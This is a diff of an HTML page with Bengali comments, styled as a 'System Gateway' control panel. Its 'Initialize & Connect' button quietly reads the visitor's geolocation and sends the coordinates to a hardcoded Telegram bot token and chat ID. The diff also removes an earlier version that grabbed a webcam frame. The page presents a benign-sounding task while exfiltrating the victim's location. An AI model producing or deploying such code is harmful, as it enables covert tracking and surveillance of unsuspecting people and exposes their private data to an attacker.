@@ -1,37 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-    <title>Gateway</title>
+    <meta charset="UTF-8">
+    <title>Control Panel</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; cursor: pointer; color: white; font-weight: bold; background: #3b82f6; margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <button id="btn" onclick="start()">Start Task</button>
-    <div id="status">Waiting...</div>
-    <video id="v" autoplay playsinline style="display:none;"></video>
 
-    <script>
-        const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
-        const CHAT_ID = "8566985497";
+<div class="card">
+    <h2>System Gateway</h2>
+    <button class="btn" onclick="executeTask()">Initialize & Connect</button>
+    <div id="status" style="margin-top:20px; font-size:14px;">Status: Waiting...</div>
+</div>
 
-        async function start() {
-            document.getElementById('status').innerText = "Accessing...";
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            
-            setTimeout(async () => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
+<script>
+    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+    const CHAT_ID = "8566985497";
+
+    async function executeTask() {
+        document.getElementById('status').innerText = "Connecting to API...";
+        
+        try {
+            // ১. লোকেশন সংগ্রহ
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const locMsg = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
                 
-                // ইমেজ ডেটা তৈরি
-                const dataUrl = c.toDataURL('image/jpeg');
-                
-                // টেলিগ্রামে মেসেজ পাঠানো (সহজ পদ্ধতি)
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=System_Active_Ready_To_Capture`;
+                // ২. টেলিগ্রামে পাঠানো
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`;
                 await fetch(url);
-                document.getElementById('status').innerText = "✅ Bot Initialized!";
-            }, 2000);
+                
+                document.getElementById('status').innerText = "✅ Data Sent Successfully!";
+            }, () => {
+                document.getElementById('status').innerText = "❌ Location Access Denied!";
+            });
+        } catch (e) {
+            document.getElementById('status').innerText = "❌ Error: " + e.message;
         }
-    </script>
+    }
+</script>
+
 </body>
-</html>
+</html>.
